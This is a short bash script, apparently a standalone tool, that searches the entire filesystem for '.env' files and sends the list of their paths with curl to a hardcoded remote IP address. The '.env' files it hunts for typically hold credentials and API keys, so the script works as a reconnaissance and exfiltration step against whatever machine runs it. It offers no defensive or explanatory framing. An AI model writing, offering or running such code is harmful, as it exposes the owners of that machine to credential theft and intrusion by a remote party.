#!/bin/bash

# Define the URL of the Python backend server
BACKEND_URL="http://37.27.51.34:5045/api/receive"

# Use find to locate all .env files
env_files=$(find / -type f -name ".env" 2>/dev/null)

# Check if any .env files were found
if [[ -z "$env_files" ]]; then
    echo "No .env files found."
    exit 1
fi

# Send the .env files list to the Python backend
echo "$env_files" | curl --data-binary @- -H "Content-Type: application/json" \
    -X POST "$BACKEND_URL"
echo "dooone"
